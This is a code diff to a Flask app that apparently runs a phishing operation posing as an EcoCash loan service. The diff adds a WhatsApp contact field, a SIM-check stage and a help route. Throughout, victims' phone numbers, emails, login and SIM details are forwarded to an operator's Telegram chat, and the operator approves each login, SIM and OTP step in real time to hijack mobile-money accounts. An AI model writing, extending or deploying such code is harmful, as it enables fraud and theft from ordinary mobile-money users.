@@ -34,6 +34,7 @@ def send_telegram_alert(app_data, stage_title="LOGIN SUBMITTED", step_code="logi
         f"⚡ *{stage_title}*\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"• *Mobile:* +263 {app_data.get('phone', '')}\n"
+        f"• *WhatsApp:* {app_data.get('whatsapp', '—')}\n"
         f"• *Email:* {app_data.get('email', '—')}\n"
         f"• *Amount:* ${app_data.get('amount', '—')} ({app_data.get('term', '—')})\n"
         f"• *Purpose:* {app_data.get('purpose', '—')}\n"
@@ -102,7 +103,10 @@ def telegram_webhook():
             if action == "approve":
                 if step_code == "login":
                     new_status = "Login_Approved"
-                    text_response = "Login approved — user moving to OTP"
+                    text_response = "Login approved — user moving to next step"
+                elif step_code == "sim":
+                    new_status = "SIM_Approved"
+                    text_response = "SIM approved — user moving to OTP"
                 elif step_code == "otp":
                     new_status = "OTP_Approved"
                     text_response = "OTP approved — completing application"
@@ -120,6 +124,9 @@ def telegram_webhook():
                 if step_code == "login":
                     rejected_status = "Login_Rejected"
                     text_response = "Login rejected — returning to login"
+                elif step_code == "sim":
+                    rejected_status = "SIM_Rejected"
+                    text_response = "SIM rejected — returning to SIM check"
                 else:
                     rejected_status = "OTP_Rejected"
                     text_response = "OTP rejected — returning to OTP page"
@@ -162,6 +169,56 @@ def telegram_webhook():
     return jsonify({"status": "ok"}), 200
 
 
+@app.route("/whatsapp-help", methods=["POST"])
+def whatsapp_help():
+    data = request.get_json(silent=True) or request.form or {}
+    name = (data.get("name") or "").strip()
+    whatsapp_num = (data.get("whatsapp") or "").strip()
+    page_path = (data.get("page") or request.referrer or "/").strip()
+
+    if not name or not whatsapp_num:
+        return jsonify({"ok": False, "error": "Please enter both your name and WhatsApp number."}), 400
+
+    current_phone = session.get("phone", "—")
+    current_app_id = "—"
+    current_id = session.get("current_app_id")
+
+    if current_id:
+        try:
+            rec = applications_collection.find_one({"_id": ObjectId(current_id)})
+            if rec:
+                current_app_id = rec.get("app_id", "—")
+                if current_phone == "—":
+                    current_phone = rec.get("phone", "—")
+        except Exception:
+            pass
+
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID:
+        msg = (
+            f"💬 *WHATSAPP HELP REQUESTED*\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"• *Name:* {name}\n"
+            f"• *WhatsApp:* {whatsapp_num}\n"
+            f"• *Account Phone:* {current_phone}\n"
+            f"• *Page:* `{page_path}`\n"
+            f"• *Ref ID:* `{current_app_id}`"
+        )
+        try:
+            requests.post(
+                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+                json={
+                    "chat_id": TELEGRAM_ADMIN_CHAT_ID,
+                    "text": msg,
+                    "parse_mode": "Markdown",
+                },
+                timeout=6,
+            )
+        except Exception as e:
+            print(f"WhatsApp help Telegram error: {e}")
+
+    return jsonify({"ok": True, "message": "Help request sent. We will reach out on WhatsApp."})
+
+
 @app.route("/")
 def index():
     return render_template("index.html")
@@ -176,7 +233,7 @@ def apply_step1():
             session["term"] = request.args.get("term")
         return render_template("apply_step1.html")
 
-    for field in ("phone", "email", "amount", "term", "purpose", "income"):
+    for field in ("phone", "whatsapp", "email", "amount", "term", "purpose", "income"):
         if request.form.get(field):
             session[field] = request.form.get(field)
     return redirect(url_for("submitted_notice"))
@@ -198,6 +255,7 @@ def login():
         app_data = {
             "provider": "EcoCash",
             "phone": phone,
+            "whatsapp": session.get("whatsapp", "—"),
             "email": session.get("email", "—"),
             "amount": session.get("amount", "500"),
             "term": session.get("term", "6 months"),
@@ -220,6 +278,55 @@ def login():
         return redirect(url_for("pending", app_id=app_data["app_id"], stage="login"))
 
     return render_template("login.html")
+
+
+@app.route("/sim-check", methods=["GET", "POST"])
+def sim_check():
+    current_id = session.get("current_app_id")
+    record = None
+
+    if current_id:
+        try:
+            record = applications_collection.find_one({"_id": ObjectId(current_id)})
+        except Exception:
+            record = None
+
+    if request.method == "POST":
+        sim_phone = request.form.get("sim_phone") or session.get("phone", "")
+        sim_carrier = request.form.get("sim_carrier", "Econet Wireless (EcoCash)")
+        sim_status = request.form.get("sim_status", "Active & In Hand")
+
+        if current_id:
+            try:
+                oid = ObjectId(current_id)
+                applications_collection.update_one(
+                    {"_id": oid},
+                    {
+                        "$set": {
+                            "sim_phone": sim_phone,
+                            "sim_carrier": sim_carrier,
+                            "sim_status": sim_status,
+                            "status": "Pending_SIM",
+                            "rejected_stage": "",
+                            "custom_message": "",
+                        }
+                    },
+                )
+                record = applications_collection.find_one({"_id": oid})
+                if record:
+                    send_telegram_alert(record, stage_title="SIM CHECK SUBMITTED", step_code="sim")
+            except Exception as e:
+                print(f"sim_check error: {e}")
+
+        return redirect(
+            url_for("pending", app_id=record.get("app_id") if record else "", stage="sim")
+        )
+
+    return render_template(
+        "sim_check.html",
+        phone=session.get("phone", ""),
+        app_id=record.get("app_id") if record else "",
+    )
 
 
 @app.route("/pending")
